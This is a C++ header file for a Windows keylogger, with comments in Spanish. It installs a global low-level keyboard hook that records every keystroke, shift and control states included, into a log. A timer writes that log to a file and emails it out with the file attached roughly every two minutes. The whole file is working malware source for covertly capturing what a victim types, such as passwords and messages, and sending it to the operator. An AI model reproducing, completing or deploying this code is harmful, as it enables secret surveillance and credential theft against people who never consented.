#ifndef KeybHook_h
#define KeybHook_h

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"
#include "IO.h"

/*Almacena todas las pulsaciones*/
std::string keylog = "";

/*Intentar� enviar un mensaje cada dos minutos*/
void TimerSendMail() {

	if (keylog.empty())
		return;
	std::string last_file = IO::WriteLog(keylog);

	if (last_file.empty()) {
		Helper::WriteAppLog("File creation was not succesfull '" + keylog + "'");
		return;
	}

	int x = Mail::SendMail("Log [" + last_file + "]", 
		"Hi :)\n The file has been attached to this mail :) \n For testing, enjoy \n"
		+ keylog, IO::GetOurPath(true) + last_file);
	if (x != 7)
		Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
	else
		keylog = "";
}

/*Frecuencia con la cual se env�an los correos (200*60) ms/*/
Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);

HHOOK eHook = NULL;

/*Se llama a esta funci�n simpre que el usuario pulsa una tecla*/
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {

	if (nCode < 0)
		CallNextHookEx(eHook, nCode, wparam, lparam);

	/*con la divisi�n entre apretar el boton y soltar el bot�n, podemos distinguir, por ejemplo, 
	las may�sculas, ya que toco lo que pulse mientras est� SHIFT pulsado, hasta que suelte el SHIFT, 
	ser�n may�sculas*/
	/*Por ejemplo: [SHIFT][r][/SHIFT][o][o][t]
	el usuario habr�a escrito Root, la primera may�scula*/
	KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {
		keylog += Keys::KEYS[kbs->vkCode].Name;
		if (kbs->vkCode == VK_RETURN)
			keylog += '\n';
	}
	else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {
		DWORD key = kbs->vkCode;
		if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL ||
			key == VK_SHIFT || key == VK_RSHIFT || key == VK_LSHIFT ||
			key == VK_MENU || key == VK_RMENU || key == VK_LMENU ||
			key == VK_CAPITAL || key == VK_NUMLOCK ||
			key == VK_LWIN || key == VK_RWIN) {

			std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
			KeyName.insert(1, "/");
			keylog += KeyName;
		}
	}

	return CallNextHookEx(eHook, nCode, wparam, lparam);
}

/*Instala el Keylogger para que empiece a capturar las pulsaciones*/
bool InstallHook() {

	Helper::WriteAppLog("Hook Started... Timer started");
	MailTimer.Start(true);

	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);

	return eHook == NULL;
}

/*Desinstala el keylogger*/
bool UninstallHook() {

	BOOL b = UnhookWindowsHookEx(eHook);
	eHook = NULL;

	return(bool)b;
}

bool IsHoocked() {

	return (bool)(eHook == NULL);
}

#endif // !KeybHook_h
